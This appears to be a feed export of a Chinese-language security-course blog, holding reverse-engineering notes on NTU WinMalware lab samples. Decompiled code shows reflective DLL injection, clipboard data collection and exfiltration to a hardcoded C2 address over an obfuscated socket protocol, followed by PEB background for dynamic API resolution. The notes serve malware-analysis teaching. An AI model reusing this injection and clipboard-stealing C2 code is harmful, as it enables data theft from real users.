&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LastError &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;WriteProcessMemory failed, %lu&amp;#34;&lt;/span>, LastError);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;OpenProcess failed, %lu&amp;#34;&lt;/span>, v4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;get_reflectivce_loader_offset failed&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/</guid><description>&lt;h1 id="simple-reverse---0x222023-lab---winmalware---collect">
 Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)
 &lt;a class="anchor" href="#simple-reverse---0x222023-lab---winmalware---collect">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>如果想要分析DLL，可以從以下三個地方切入&lt;/p>
&lt;ul>
&lt;li>_DllMainCRTStartup (DLL 載入和移除時的初始化與收尾)
&lt;ul>
&lt;li>DllMain / DllEntryPoint / CRT_INIT (function signature 相同)&lt;/li>
&lt;li>找有三個參數的 function call
&lt;img src="https://hackmd.io/_uploads/Sk0GgCaz6.png" alt="" />
範例就大概像這樣，從&lt;code>_DllMainCRTStartup&lt;/code>底下有&lt;code>call _CRT_INIT&lt;/code>和&lt;code>call DllEntryPoint&lt;/code>(&lt;code>DllMain&lt;/code>在比較下面)
&lt;img src="https://hackmd.io/_uploads/HklyZRTf6.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Exported Functions&lt;/li>
&lt;li>TLS Callback&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-openclipboard">OpenClipboard&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-getclipboarddata">GetClipboardData&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-globallock">globalLock&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/cpp/c-runtime-library/reference/itoa-itow?view=msvc-170">_itoa&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>IDA解析的source code很常會出現明明沒有return value但還是自動建立的狀況，所以適時的刪除return value(Shift+DEL)是對分析比較好的做法&lt;/p>
&lt;ul>
&lt;li>DllMain
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
 if ( fdwReason == 1 )
 {
 MessageBoxA(0i64, &amp;#34;Reflective Dll Injection success. Remember to delete the persistence file&amp;#34;, &amp;#34;eductf-lab&amp;#34;, 0);
 my_main(); // 不重要的東西
 collect_and_exfiltrate();
 }
 return 1;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>collect_and_exfiltrate
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">void collect_and_exfiltrate(void)
{
 PUCHAR pbInput; // [rsp+28h] [rbp-10h] BYREF

 pbInput = 0i64;
 collect_data(&amp;amp;pbInput);
 exfiltrate(pbInput);
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>collect_data
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">void __fastcall collect_data(char **pbInput)
{
 char *pbInput_1; // [rsp+28h] [rbp-10h] BYREF

 collect_get_clipboard_data(&amp;amp;pbInput_1);
 *pbInput = pbInput_1;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>collect_get_clipboard_data
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">void __fastcall collect_get_clipboard_data(LPVOID *pbInput)
{
 HANDLE ClipboardData; // rax
 void *v3; // rsi
 int LastError; // eax
 char Buffer[34]; // [rsp+26h] [rbp-22h] BYREF

 if ( OpenClipboard(0i64) )
 {
 ClipboardData = GetClipboardData(1u);
 v3 = ClipboardData;
 if ( ClipboardData )
 {
 *pbInput = GlobalLock(ClipboardData);
 GlobalUnlock(v3);
 }
 else
 {
 LastError = GetLastError();
 _itoa(LastError, Buffer, 10);
 }
 }
 CloseClipboard();
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>目前要分析的重點著重在DllMain中，所以其他的切入點可以先不管，並且先聚焦在collect data身上。其實作者一開始就有把debug information都放在這邊，所以分析可以更順暢&lt;/p></description></item><item><title>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/</guid><description>&lt;h1 id="simple-reverse---0x232023-lab---winmalware---exfiltrate">
 Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)
 &lt;a class="anchor" href="#simple-reverse---0x232023-lab---winmalware---exfiltrate">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>請根據 next stage payload 的行為，分析 capture.pcapng 中的封包，找出並解密被滲出/傳送到 C2 server 的資料。&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-wsastartup">WSAStartup&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-htons">htons&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-socket">socket&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/winsock/sockaddr-2">sockaddr&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-wsaconnect">WSAConnect&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>exfiltrate
:::spoiler source
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">exfiltrate&lt;/span>(PUCHAR pbInput)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> s[&lt;span style="color:#ae81ff">2&lt;/span>]; &lt;span style="color:#75715e">// [rsp+28h] [rbp-10h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> connect_to_c2(s);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send_collected_data_to_c2(s[&lt;span style="color:#ae81ff">0&lt;/span>], pbInput);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shutdown(s[&lt;span style="color:#ae81ff">0&lt;/span>], &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> closesocket(s[&lt;span style="color:#ae81ff">0&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>connect_to_c2
:::spoiler source
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">connect_to_c2&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v2; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sockaddr&lt;/span> name; &lt;span style="color:#75715e">// [rsp+20h] [rbp-1B8h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">WSAData&lt;/span> WSAData; &lt;span style="color:#75715e">// [rsp+30h] [rbp-1A8h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>WSAStartup(&lt;span style="color:#ae81ff">0x202u&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>WSAData) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&amp;amp;&lt;/span>name.sa_data[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">168470720&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>name.sa_data &lt;span style="color:#f92672">=&lt;/span> htons(&lt;span style="color:#ae81ff">0x2BB3u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name.sa_family &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> socket(&lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>a1 &lt;span style="color:#f92672">=&lt;/span> v2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> connect(v2, &lt;span style="color:#f92672">&amp;amp;&lt;/span>name, &lt;span style="color:#ae81ff">16&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>send_collected_data_to_c2
:::spoiler source
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">send_collected_data_to_c2&lt;/span>(SOCKET s, PUCHAR pbInput)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v4; &lt;span style="color:#75715e">// rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v5; &lt;span style="color:#75715e">// esi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v7; &lt;span style="color:#75715e">// al
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> j; &lt;span style="color:#75715e">// ecx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v9; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x4Cu&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( send(s, v4, &lt;span style="color:#ae81ff">76&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0xB&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( v5 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( recv(s, v4, &lt;span style="color:#ae81ff">76&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0xB&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> ( v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encrypt_key &lt;span style="color:#f92672">=&lt;/span> (v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encrypt_data(pbInput);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>] &lt;span style="color:#f92672">+=&lt;/span> v4[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>] &lt;span style="color:#f92672">-&lt;/span> v4[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memcpy_s(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">0x18u&lt;/span>i64, cipher, &lt;span style="color:#ae81ff">0x18u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_20;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; j &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">39&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>j )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> v4[j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4[&lt;span style="color:#ae81ff">43&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4[&lt;span style="color:#ae81ff">49&lt;/span>] &lt;span style="color:#f92672">-&lt;/span> v4[&lt;span style="color:#ae81ff">67&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4[j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4[j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v4[&lt;span style="color:#ae81ff">54&lt;/span>] &lt;span style="color:#f92672">-&lt;/span> (v4[&lt;span style="color:#ae81ff">61&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4[&lt;span style="color:#ae81ff">69&lt;/span>]) &lt;span style="color:#f92672">+&lt;/span> v7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send(s, v4, &lt;span style="color:#ae81ff">76&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_20:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> free(v4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>&lt;code>connet_to_c2&lt;/code>
目標是取得c2 server的IP和port number&lt;/p></description></item><item><title>Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/</guid><description>&lt;h1 id="simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background">
 Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)
 &lt;a class="anchor" href="#simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Process Environment Block (PEB)
&lt;ul>
&lt;li>紀錄許多 Process 相關資訊的 OS 資料結構&lt;/li>
&lt;li>存在於 user land&lt;/li>
&lt;li>x86 環境下，可以從 fs:[0x30] 取得&lt;/li>
&lt;li>x64 環境下，可以從 gs:[0x60] 取得&lt;/li>
&lt;li>==0x18: Ldr==
&lt;ul>
&lt;li>指向 _PEB_LDR_DATA 結構&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20%282022%20Update%29/_PEB">_PEB&lt;/a> (注意 x64 和 x86 結構不同)
&lt;img src="https://hackmd.io/_uploads/HyIcW4CfT.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>_PEB_LDR_DATA
&lt;ul>
&lt;li>紀錄 Process 中載入模組的相關資訊
&lt;ul>
&lt;li>模組 module：PE 或 DLL&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==0x10: InLoadOrderModuleList==
&lt;ul>
&lt;li>指向 _LDR_DATA_TABLE_ENTRY&lt;/li>
